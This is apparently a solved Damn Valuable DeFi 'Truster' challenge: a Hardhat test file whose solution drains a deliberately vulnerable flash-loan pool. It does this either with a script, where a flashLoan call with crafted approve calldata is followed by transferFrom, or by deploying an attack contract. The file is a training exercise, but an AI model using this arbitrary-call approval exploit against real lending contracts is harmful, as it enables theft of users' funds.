const { ethers } = require('hardhat')
const { expect } = require('chai')

describe('[Challenge] Truster', function () {
    let deployer, player
    let token, pool

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, player] = await ethers.getSigners()

        token = await (
            await ethers.getContractFactory('DamnValuableToken', deployer)
        ).deploy()
        pool = await (
            await ethers.getContractFactory('TrusterLenderPool', deployer)
        ).deploy(token.address)
        expect(await pool.token()).to.eq(token.address)

        await token.transfer(pool.address, TOKENS_IN_POOL)
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL)

        expect(await token.balanceOf(player.address)).to.equal(0)
    })

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        async function attackWithContract() {
            console.log('ATTACK WITH CONTRACT')
            const attackContractFactory = await ethers.getContractFactory(
                'AttackTruster'
            )
            const bytecode = attackContractFactory.bytecode
            const deployData = attackContractFactory.interface.encodeDeploy([
                pool.address,
                token.address
            ])
            await player.sendTransaction({
                to: null,
                data: ethers.utils.hexConcat([bytecode, deployData]),
                gasLimit: 30000000n
            })
        }

        async function attackWithScript() {
            console.log('ATTACK WITH SCRIPT')
            const attackData = token.interface.encodeFunctionData('approve', [
                player.address,
                TOKENS_IN_POOL
            ])

            const flashLoanTx = {
                to: pool.address,
                data: pool.interface.encodeFunctionData('flashLoan', [
                    0,
                    player.address,
                    token.address,
                    attackData
                ])
            }

            const transerTx = {
                to: token.address,
                data: token.interface.encodeFunctionData('transferFrom', [
                    pool.address,
                    player.address,
                    TOKENS_IN_POOL
                ])
            }

            const txs = [flashLoanTx, transerTx]

            for (const tx of txs) {
                await player.sendTransaction(tx)
            }
        }

        await attackWithScript()
        // await attackWithContract()
    })

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL)
        expect(await token.balanceOf(pool.address)).to.equal(0)
    })
})
